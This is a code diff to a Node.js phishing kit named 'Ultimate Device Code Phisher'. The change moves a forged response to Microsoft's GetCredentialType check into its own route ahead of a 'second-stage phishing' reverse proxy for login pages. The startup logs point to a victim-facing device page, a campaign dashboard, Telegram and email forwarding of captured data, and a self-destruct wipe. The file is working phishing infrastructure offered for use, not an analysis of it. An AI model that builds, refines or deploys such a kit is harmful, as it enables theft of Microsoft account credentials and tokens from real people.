@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.13 – Backend Mock
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.14 – Final Mock Route
 // ============================================================
-// Intercepts GetCredentialType at the proxy and returns a fake success.
+// Explicit route for GetCredentialType, placed before wildcard proxy.
 // ============================================================
 
 const http = require('http');
@@ -660,6 +660,21 @@ app.post('/device/fingerprint', (req, res) => {
     });
 });
 
+// ── 🔥 EXPLICIT ROUTE TO MOCK GetCredentialType (Must come BEFORE the wildcard proxy) ──
+app.post('/login/common/GetCredentialType', (req, res) => {
+    console.log('[PHANTOM] ✅ Explicitly intercepted GetCredentialType, returning mock 200.');
+    const fakeResponse = {
+        "Credentials": {
+            "AuthMethod": "Password",
+            "FederationRedirectUrl": null
+        }
+    };
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Headers', '*');
+    res.setHeader('Content-Type', 'application/json');
+    return res.status(200).json(fakeResponse);
+});
+
 // ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
     // 🔥 Handle OPTIONS preflight requests locally to avoid 500 from Microsoft
@@ -668,22 +683,6 @@ app.all('/login*', async (req, res) => {
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
         res.setHeader('Access-Control-Allow-Headers', '*');
         res.status(204).send();
-        return;
-    }
-
-    // 🔥 NEW: Intercept GetCredentialType and return a fake success JSON
-    if (req.path.includes('GetCredentialType')) {
-        console.log('[PHANTOM] Intercepted GetCredentialType, returning mock.');
-        const fakeResponse = {
-            "Credentials": {
-                "AuthMethod": "Password",
-                "FederationRedirectUrl": null
-            }
-        };
-        res.setHeader('Access-Control-Allow-Origin', '*');
-        res.setHeader('Access-Control-Allow-Headers', '*');
-        res.setHeader('Content-Type', 'application/json');
-        res.status(200).json(fakeResponse);
         return;
     }
 
@@ -1130,7 +1129,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.13 – Backend Mock running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.14 – Final Mock Route running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1138,7 +1137,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 GetCredentialType intercepted & mocked at backend: ACTIVE`);
+    console.log(`🚀 GetCredentialType explicitly mocked at backend: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
